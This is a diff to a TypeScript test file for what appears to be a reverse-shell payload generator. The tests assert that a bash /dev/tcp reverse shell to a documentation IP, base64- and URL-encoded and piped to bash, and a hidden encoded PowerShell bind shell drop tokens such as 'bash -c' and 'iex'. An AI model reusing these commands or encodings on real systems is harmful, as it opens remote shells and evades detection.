@@ -46,7 +46,8 @@ describe("buildPayload with a filter", () => {
   it("bash-tcp in url-param, b64: the b64 form instead of bash -c, then URL-encoded", () => {
     const b = buildPayload(def("bash-tcp"), "url-param", V, { filter: "b64" });
     expect(b.text).toBe("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMC4yLjEwLzQ0MyAwPiYx%7Cbase64+-d%7Cbash");
-    expect(b.parts.length).toBeGreaterThan(def("bash-tcp").parts.length);
+    // None of bash-tcp's own tokens (bash -i, >&, /dev/tcp/, 0>&1, bash -c) show in the b64 form.
+    expect(b.parts).toEqual(applyFilter("bash -i >& /dev/tcp/192.0.2.10/443 0>&1", "b64").parts);
     expect(b.notes.join(" ")).toMatch(/base64/i);
   });
   it("injected-linux, b64: no bash -c and no URL encoding", () => {
@@ -102,5 +103,12 @@ describe("buildPayload with a filter", () => {
     const tokens = (f: "b64" | "hex") => buildPayload(def("bash-tcp"), "url-param", V, { filter: f }).parts.map((p) => p.token);
     expect(tokens("b64").filter((t) => t.includes("bash -c"))).toEqual([]);
     expect(tokens("hex").filter((t) => t.includes("bash -c"))).toHaveLength(1);
+  });
+  it("bind-ps with ps-b64 keeps only parts that still show: no -c, one -nop", () => {
+    const t = buildPayload(def("bind-ps"), "url-param", V, { filter: "ps-b64" }).parts.map((p) => p.token);
+    expect(t).not.toContain("-c");
+    expect(t).not.toContain("iex");
+    expect(t.filter((x) => x === "-nop")).toHaveLength(1);
+    expect(t).toEqual(["powershell", "-nop", "-w hidden", "-e"]);
   });
 });
